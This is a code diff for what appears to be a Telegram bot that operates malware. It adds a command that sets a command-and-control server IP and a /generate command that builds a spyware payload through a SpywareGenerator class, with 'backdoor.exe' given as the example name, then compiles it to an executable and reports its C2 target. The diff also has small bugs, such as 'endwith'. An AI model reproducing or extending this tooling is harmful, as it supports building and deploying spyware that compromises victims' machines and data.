@@ -3577,6 +3577,57 @@ async def set_c2_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip_address):
         await update.message.reply_text("Invalid IP format.")
         return
+        
+    global C2_SERVER_IP
+    C2_SERVER_IP = ip_address
+    
+    await update.message.reply_text(
+        f"C2 Server IP updated to: `{ip_address}`.\n"
+        f"All future payloads will connect to this address.",
+        parse_mode="Markdown"
+    )
+    
+async def generate_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /generate <filename> [custom_logic]
+    Generates a spyware payload and compiles it.
+    """
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("Access Denied.")
+        return
+        
+    if len(context.args) < 1:
+        await update.message.reply_text(
+            "Usage: /generate <filename.exe> [optional_custom_code]\n"
+            "Example: /generate backdoor.exe 'print(\"Hello\")'\n"
+            f"Target C2: {C2_SERVER_IP}:{C2_SERVER_PORT}"
+        )
+        return
+        
+    filename = context.args[0]
+    if not filename.endwith('.exe'):
+        filename += '.exe'
+        
+    custom_code = " ".join(context.args[1:]) if len(context.args) > 1 else None
+    
+    generator = SpywareGenerator()
+    
+    # Step 1: Generate Python Source 
+    source_code = generator.generate_payload(C2_SERVER_IP, C2_SERVER_PORT, custom_code)
+    
+    # Step 2: Compile to Excutable
+    output_path = generator.compile_to_exe(source_code, filename)
+    
+    # Step 3: Calculate Hash
+    with open(output_path, 'rb') as f:
+        file_hash = hashlib.sha256(f.read()).hexdigest()
+        
+    # Step 4: Send File to User
+    await update.message.reply_text(
+        f"Payload Generated Successfully!\n"
+        f"Filename: `{filename}`\n"
+        f"Target C2: {C2_SERVER_IP}:{C2_SERVER_PORT}\n"
+    )
 
         
 # ---------------- GitHub Repository Manager (Phase 7) ----------------
